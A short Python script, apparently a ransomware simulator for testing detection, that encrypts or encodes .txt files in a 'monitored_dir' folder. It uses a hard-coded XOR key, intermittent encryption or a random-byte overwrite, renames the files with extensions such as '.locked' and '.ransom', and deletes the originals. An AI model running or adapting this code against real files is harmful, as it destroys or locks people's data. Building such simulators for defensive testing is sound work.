import os
import base64
import random
from pathlib import Path

TARGET_DIR = Path(__file__).parent / "monitored_dir"
KEY = b"mysecretkey"

# Encrypt entire file using XOR
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Encrypt base64 of XOR output
def xor_then_base64(data: bytes, key: bytes) -> bytes:
    return base64.b64encode(xor_encrypt(data, key))

# Intermittent encryption: encrypt every X bytes and skip Y
def intermittent_encrypt(data: bytes, key: bytes, chunk_size=8, skip_size=8) -> bytes:
    result = bytearray()
    i = 0
    while i < len(data):
        chunk = data[i:i+chunk_size]
        result.extend(xor_encrypt(chunk, key))
        i += chunk_size
        result.extend(data[i:i+skip_size])
        i += skip_size
    return bytes(result)

# Encrypt file and rename with suspicious extension
def encrypt_file(path: Path, method, suffix=None):
    with open(path, "rb") as f:
        data = f.read()
    new_data = method(data)
    new_path = path
    if suffix:
        new_path = path.with_suffix(path.suffix + suffix)
    with open(new_path, "wb") as f:
        f.write(new_data)
    if new_path != path:
        os.remove(path)
    print(f"[+] {method.__name__} → {new_path.name}")

def main():
    for file in TARGET_DIR.glob("*.txt"):
        name = file.stem.lower()

        if "base64" in name:
            encrypt_file(file, lambda d: base64.b64encode(d), ".enc")
        elif "hex" in name:
            encrypt_file(file, lambda d: d.hex().encode(), ".enc")
        elif "plain" in name:
            encrypt_file(file, lambda d: xor_encrypt(d, KEY), ".locked")
        elif "partial" in name:
            encrypt_file(file, lambda d: intermittent_encrypt(d, KEY), ".cripto")
        elif "xorbase64" in name:
            encrypt_file(file, lambda d: xor_then_base64(d, KEY), ".ransom")
        elif "random" in name:
            encrypt_file(file, lambda d: os.urandom(len(d)), ".crypt")
        else:
            # Default: use full XOR + rename
            encrypt_file(file, lambda d: xor_encrypt(d, KEY), ".enc")

if __name__ == "__main__":
    main()
